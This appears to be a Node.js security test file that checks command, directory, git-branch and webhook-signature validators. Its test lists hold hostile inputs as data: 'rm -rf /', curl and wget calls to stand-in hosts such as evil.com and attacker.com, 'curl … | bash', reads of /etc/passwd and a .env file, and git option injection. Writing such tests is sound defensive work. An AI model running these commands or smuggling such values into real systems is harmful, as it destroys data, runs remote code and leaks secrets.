import test from 'node:test';
import assert from 'node:assert/strict';
import crypto from 'node:crypto';

test('Security: Command validation regexes reject shell injection attempts', () => {
  const DISALLOWED_CHARS = /[;&|`$<>\n\r\0]/;
  const safeInstall = /^npm\s+(ci|install|i)(\s+[\w\-./=@]+)*$/i;
  const safeRun = /^npm\s+run\s+[a-zA-Z0-9_-]+$/i;
  const safeTest = /^npm\s+test(\s+[\w\-./=@]+)*$/i;

  const maliciousCommands = [
    'npm install; rm -rf /',
    'npm install && curl https://evil.com',
    'npm install | cat /etc/passwd',
    'npm install `id`',
    'npm install $(whoami)',
    'npm test; echo hacked',
    'npm run build && wget http://attacker.com/malware',
    'npm run build; cat /Users/dilipan/.env',
    'npm install\nmalicious_cmd',
    'npm install\rmalicious_cmd',
    'bash -c "rm -rf /"',
    'sh -c "echo hacked"',
    'curl https://malicious.com | bash'
  ];

  for (const cmd of maliciousCommands) {
    const hasDisallowed = DISALLOWED_CHARS.test(cmd);
    const passesInstall = safeInstall.test(cmd) || safeRun.test(cmd);
    const passesTest = safeTest.test(cmd) || safeRun.test(cmd);
    const passesBuild = safeRun.test(cmd);

    assert.ok(
      hasDisallowed || (!passesInstall && !passesTest && !passesBuild),
      `Malicious command "${cmd}" should be rejected by security filters`
    );
  }
});

test('Security: Command validation allows standard legitimate commands', () => {
  const DISALLOWED_CHARS = /[;&|`$<>\n\r\0]/;
  const safeInstall = /^npm\s+(ci|install|i)(\s+[\w\-./=@]+)*$/i;
  const safeRun = /^npm\s+run\s+[a-zA-Z0-9_-]+$/i;
  const safeTest = /^npm\s+test(\s+[\w\-./=@]+)*$/i;

  const validInstallCommands = [
    'npm ci',
    'npm install',
    'npm install --force --include=dev',
    'npm i --production',
    'npm run setup'
  ];

  for (const cmd of validInstallCommands) {
    assert.strictEqual(DISALLOWED_CHARS.test(cmd), false);
    assert.ok(safeInstall.test(cmd) || safeRun.test(cmd), `Valid install command "${cmd}" should pass validation`);
  }

  const validTestCommands = [
    'npm test',
    'npm test --watchAll=false',
    'npm run test-ci'
  ];

  for (const cmd of validTestCommands) {
    assert.strictEqual(DISALLOWED_CHARS.test(cmd), false);
    assert.ok(safeTest.test(cmd) || safeRun.test(cmd), `Valid test command "${cmd}" should pass validation`);
  }

  const validBuildCommands = [
    'npm run build',
    'npm run compile',
    'npm run build-prod'
  ];

  for (const cmd of validBuildCommands) {
    assert.strictEqual(DISALLOWED_CHARS.test(cmd), false);
    assert.ok(safeRun.test(cmd), `Valid build command "${cmd}" should pass validation`);
  }
});

test('Security: Output directory traversal rejection', () => {
  const SAFE_DIR = /^[a-zA-Z0-9_.-]+(\/[a-zA-Z0-9_.-]+)*$/;

  const maliciousDirs = [
    '../',
    '../../etc',
    '/root',
    '/etc/passwd',
    'dist/../../secrets',
    'build/..',
    'dist\0malicious',
    'dist;rm -rf'
  ];

  for (const dir of maliciousDirs) {
    const isSafe = SAFE_DIR.test(dir) && !dir.includes('..') && !dir.startsWith('/');
    assert.strictEqual(isSafe, false, `Malicious directory path "${dir}" should be rejected`);
  }

  const validDirs = ['dist', 'build', 'public', 'out', 'build/web', 'dist-prod'];
  for (const dir of validDirs) {
    const isSafe = SAFE_DIR.test(dir) && !dir.includes('..') && !dir.startsWith('/');
    assert.strictEqual(isSafe, true, `Valid directory path "${dir}" should be accepted`);
  }
});

test('Security: Git branch argument injection prevention', () => {
  const BRANCH_PATTERN = /^[A-Za-z0-9._\/-]{1,100}$/;

  const maliciousBranches = [
    '--upload-pack=evil',
    '--exec=calc.exe',
    '-u',
    'main; rm -rf /',
    'feature/branch && evil',
    'branch with spaces'
  ];

  for (const branch of maliciousBranches) {
    const isValid = BRANCH_PATTERN.test(branch) && !branch.startsWith('-');
    assert.strictEqual(isValid, false, `Malicious branch "${branch}" must be rejected`);
  }

  const validBranches = ['main', 'master', 'feat/add-auth', 'release/v1.0.0', 'hotfix_123'];
  for (const branch of validBranches) {
    const isValid = BRANCH_PATTERN.test(branch) && !branch.startsWith('-');
    assert.strictEqual(isValid, true, `Valid branch "${branch}" must be accepted`);
  }
});

test('Security: Webhook HMAC timing-safe validation', () => {
  const secret = 'super-secret-webhook-key-12345';
  const payload = Buffer.from(JSON.stringify({ ref: 'refs/heads/main', after: 'a'.repeat(40) }));

  function validSignature(raw, header, webhookSecret) {
    const expected = 'sha256=' + crypto.createHmac('sha256', webhookSecret).update(raw).digest('hex');
    const a = Buffer.from(header || '');
    const b = Buffer.from(expected);
    return a.length === b.length && crypto.timingSafeEqual(a, b);
  }

  const validHmac = 'sha256=' + crypto.createHmac('sha256', secret).update(payload).digest('hex');
  assert.strictEqual(validSignature(payload, validHmac, secret), true);

  const invalidHmac = 'sha256=' + '0'.repeat(64);
  assert.strictEqual(validSignature(payload, invalidHmac, secret), false);
  assert.strictEqual(validSignature(payload, '', secret), false);
  assert.strictEqual(validSignature(payload, 'invalid-format', secret), false);
});
